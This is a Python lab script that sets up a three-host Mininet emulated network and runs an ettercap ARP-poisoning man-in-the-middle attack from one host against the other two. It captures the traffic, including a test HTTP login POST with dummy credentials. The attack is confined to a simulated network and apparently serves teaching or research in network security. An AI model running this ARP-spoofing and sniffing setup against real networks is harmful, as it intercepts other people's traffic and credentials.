#!/usr/bin/env python3
"""
02_arp_mitm.py
- Enables IP forwarding on h2
- Launches ettercap ARP MITM from h2 against h1<->h3
- Triggers an HTTP POST from h1 to h3 so creds appear in capture
- Captures to /tmp/arp_mitm.pcap; saves ARP tables to /tmp/arp_*.txt
Requires: /usr/local/bin/ettercap (as compiled earlier)
"""
import os, time, subprocess, signal, shutil
from mininet.net import Mininet
from mininet.node import Controller, OVSSwitch
from mininet.link import TCLink
from mininet.log import setLogLevel

ETTER = "/usr/local/bin/ettercap"
PCAP  = "/tmp/arp_mitm.pcap"

def need(prog):
    if shutil.which(prog) is None:
        raise SystemExit(f"ERROR: '{prog}' not found in PATH. Install it first.")

def start_tcpdump(iface, pcap, filt="arp or tcp port 80 or udp port 53"):
    cmd = f"tcpdump -i {iface} -w {pcap} -U -s 0 {filt}"
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    setLogLevel('info')
    if not os.path.exists(ETTER):
        raise SystemExit(f"ERROR: {ETTER} not found. Build/install ettercap first.")

    need("tcpdump"); need("curl")

    net = Mininet(controller=Controller, switch=OVSSwitch, link=TCLink, autoSetMacs=True, build=False)
    c0 = net.addController('c0')
    s1 = net.addSwitch('s1')
    h1 = net.addHost('h1', ip='10.0.0.1/24')
    h2 = net.addHost('h2', ip='10.0.0.2/24')
    h3 = net.addHost('h3', ip='10.0.0.3/24')

    net.addLink(h1, s1); net.addLink(h2, s1); net.addLink(h3, s1)
    net.build(); c0.start(); s1.start([c0])

    # Enable forwarding on attacker
    h2.cmd("sysctl -w net.ipv4.ip_forward=1")

    # Start capture on attacker's port
    dump = start_tcpdump("s1-eth2", PCAP)
    time.sleep(1)

    # Start a web server on h3 to have traffic to sniff
    h3.cmd("nohup python3 -m http.server 80 > /tmp/http_server.log 2>&1 &")

    # Launch ettercap ARP MITM from h2
    ec_cmd = f"{ETTER} -Tq -i h2-eth0 -M arp:remote /10.0.0.1// /10.0.0.3//"
    ec = h2.popen(ec_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    time.sleep(3)

    # Trigger victim traffic
    h1_out = h1.cmd('curl -i -X POST -d "username=bob&password=hacked" http://10.0.0.3/login')
    with open("/tmp/arp_http.txt", "w") as f: f.write(h1_out)

    # Snapshot ARP tables
    open("/tmp/arp_h1.txt","w").write(h1.cmd("arp -n"))
    open("/tmp/arp_h3.txt","w").write(h3.cmd("arp -n"))

    # Teardown
    h3.cmd("pkill -f 'http.server'")
    try:
        ec.terminate(); ec.wait(timeout=3)
    except Exception:
        h2.cmd("pkill ettercap")
    dump.send_signal(signal.SIGINT); dump.wait(timeout=3)
    net.stop()

    print("\nSaved artifacts:")
    print(f"  MITM capture: {PCAP}")
    print("  ARP tables:   /tmp/arp_h1.txt, /tmp/arp_h3.txt")
    print("  Victim POST:  /tmp/arp_http.txt")
    print("  Server log:   /tmp/http_server.log")

if __name__ == "__main__":
    main()
